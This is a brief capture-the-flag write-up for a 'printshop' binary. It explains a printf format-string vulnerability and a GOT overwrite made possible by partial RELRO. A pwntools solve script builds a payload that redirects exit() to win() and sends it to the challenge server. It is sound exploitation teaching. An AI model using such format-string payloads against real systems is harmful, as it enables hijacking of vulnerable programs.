![image](https://github.com/AndreQuimper/Writeups/assets/96965806/c4759a08-da21-4215-a8c6-183d5c42fc8a)

we can see that there is a security vulnerability in the way that this function uses printf. 

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/53311732-0e2a-42f0-a3d5-a47e8faeb402)
Since the binary only has partial RELRO, then we can leverage a format string vulnerability to write into the GOT

We want to replace the address of `exit()`, with the address of `win()`, a function that will print the flag.

Solve Script:
```python
#!/usr/bin/env python2

import os
import re
import sys

from pwn import *

context.arch = 'amd64'
context.bits = 64

exit_got = 0x404060
win = 0x40129d
writes = {exit_got:win}
payload = fmtstr_payload(6, writes, 0)
print(payload)
#p = process("./printshop")
p = remote('chal.pctf.competitivecyber.club',7997)

p.sendline(payload)
p.interactive()
```
